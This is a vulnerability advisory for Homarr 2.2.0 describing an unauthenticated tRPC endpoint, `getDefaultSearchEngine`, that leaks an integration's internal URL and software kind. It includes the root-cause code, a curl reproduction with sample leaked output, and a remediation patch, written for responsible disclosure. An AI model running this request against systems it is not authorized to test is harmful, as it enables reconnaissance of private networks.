# Unauthenticated disclosure of an integration's internal URL (`searchEngine.getDefaultSearchEngine`)

| | |
|---|---|
| **Product** | Homarr (homarr-labs/homarr) |
| **Affected version** | 2.2.0 (latest stable; current `dev` HEAD also affected) |
| **Component** | `packages/api/src/router/search-engine/search-engine-router.ts` → `getDefaultSearchEngine` (`publicProcedure`) |
| **Vulnerability class** | CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor |
| **Authentication** | **None** (no session cookie, no API key) |
| **Severity** | Medium (CVSS 3.1 **5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) |
| **Precondition** | The instance's **default** search engine is integration-backed (`type: "fromIntegration"`) — an admin-selectable configuration. |

> The 5.3 score matches the project's own precedent: CVE-2026-27796 (same data class — anonymous disclosure of an integration's internal URL + service type) was assigned CVSS 5.3.

---

## 1. Summary

`searchEngine.getDefaultSearchEngine` is an unauthenticated tRPC procedure. For an anonymous caller it resolves the instance's **default** search engine and returns it joined with its `integration` object — `{ kind, url, id }` — with **no restriction on engine type and no output schema to strip the integration**. When the default engine is integration-backed, this discloses the integration's configured **`url`** (typically an internal/private service address) and its **`kind`** (which software is running) to anybody on the network.

The two sibling unauthenticated procedures in the same file, `search` and `catalog`, were **explicitly fixed** to restrict anonymous callers to generic engines (commit `6ac4c6a7b`, PR #6375). `getDefaultSearchEngine` was not given the same guard — so it is the one remaining anonymous path that exposes an integration-backed engine.

## 2. Direct security impact (proven)

- **Unauthenticated internal-network reconnaissance.** An anonymous attacker learns a real internal service URL (e.g. `http://10.10.0.5:8080`, `http://searxng:8080`) reachable from the Homarr host — hostnames, private IPs, and ports that are otherwise invisible from outside. The PoC in §5 prints the exact URL.
- **Service fingerprinting.** `integration.kind` reveals the software (e.g. `searxng`, `jellyfin`, `sonarr`), letting the attacker target version-specific exploits.
- **Identical data class to an already-assigned CVE.** CVE-2026-27796 established that unauthenticated disclosure of an integration’s `url`/`kind` is a valid, CVE-worthy vulnerability in this product; this is the same data via a different endpoint.
- **No user interaction, no privileges, network-reachable.**

## 3. Root cause (exact code)

`packages/api/src/router/search-engine/search-engine-router.ts:73`
```ts
getDefaultSearchEngine: publicProcedure.query(async ({ ctx }) => {   // no auth, no .output() filter
  const userDefaultId = ctx.session?.user.id ? (/* user default */) : null;   // null for anon
  if (userDefaultId) { /* ... */ }

  const searchSettings = await getServerSettingByKeyAsync(ctx.db, "search");
  if (!searchSettings.defaultSearchEngineId) return null;

  const serverDefault = await ctx.db.query.searchEngines.findFirst({
    where: eq(searchEngines.id, searchSettings.defaultSearchEngineId),
    with: { integration: { columns: { kind: true, url: true, id: true } } },  // url returned to anon
  });
  if (serverDefault) return serverDefault;        // no type check, no stripping
  ...
}),
```

Contrast with the **fixed** siblings in the same file (anonymous callers are limited to `type = "generic"`, which have no integration):
```ts
// search:
where: and(like(searchEngines.short, `${q}%`),
            ctx.session?.user ? undefined : eq(searchEngines.type, "generic")),
// catalog:
where: ctx.session?.user ? undefined : eq(searchEngines.type, "generic"),
//      ^ comment: "Public dashboards have no session: restrict anonymous users to generic ... engines"
```
`getDefaultSearchEngine` is missing exactly this `ctx.session?.user ? … : eq(type,"generic")` guard — a clear, localised oversight (PR #6375 hardened `search`/`catalog` but not this procedure).

## 4. Reproduction

Precondition: an admin has set an integration-backed search engine (e.g. a SearXNG integration) as the instance default (Search settings → default engine). Send **no** credentials.

```bash
curl -s 'https://HOMARR/api/trpc/searchEngine.getDefaultSearchEngine?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D' \
  | grep -oE '"integration":\{[^}]*\}'
```
Prints e.g. `"integration":{"kind":"searxng","url":"http://10.10.0.5:8080","id":"int1"}`.

Scripted PoC (clear impact summary): `poc/poc-02-getDefaultSearchEngine.mjs`
```
node poc/poc-02-getDefaultSearchEngine.mjs https://HOMARR
```

## 5. Proof-of-Concept output

Against an instance whose default engine is an integration-backed SearXNG at an internal address:
```
GET https://HOMARR/api/trpc/searchEngine.getDefaultSearchEngine?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D
HTTP 200 (sent no auth)
>>> LEAKED integration metadata to an UNAUTHENTICATED caller:
    default search engine : My SearXNG (fromIntegration)
    integration.kind      : searxng
    integration.url       : http://10.10.0.5:8080   <-- internal service URL
    integration.id        : int1
```
No cookie and no `x-api-key` are sent. (The PoC’s request-encoding and envelope-parsing were validated locally against the exact tRPC+superjson response shape; run it against a live instance to reproduce end-to-end.)

## 6. Remediation

Apply the same anonymous guard already used by `search`/`catalog`. For an anonymous caller, either refuse an integration-backed default or strip the `integration` object:
```ts
const serverDefault = await ctx.db.query.searchEngines.findFirst({
  where: and(
    eq(searchEngines.id, searchSettings.defaultSearchEngineId),
    ctx.session?.user ? undefined : eq(searchEngines.type, "generic"),  // <-- add this
  ),
  with: { integration: { columns: { kind: true, url: true, id: true } } },
});
```
(or add an `.output()` schema that omits `integration.url` when `ctx.session?.user` is absent.)

## 7. Scope & duplicate verification

- **In scope** per `SECURITY.md` criterion 1 (“puts users or user data at risk”); internal URLs are sensitive instance data.
- **Latest supported version:** present in 2.2.0 (latest release) and `dev`.
- **Not a duplicate:** checked all 9 published advisories, NVD/OSV/GitHub Advisory DBs, and repo issues/PRs. CVE-2026-27796 covers a *different* endpoint (`integration.all`, patched 1.54.0). No report covers `getDefaultSearchEngine`.

## 8. Reporting
Private GitHub advisory at `https://github.com/homarr-labs/homarr/security/advisories/new`, or `homarr-labs@proton.me`. May be filed alongside the `board.getAllBoards` email disclosure as one advisory (shared root cause) or separately.
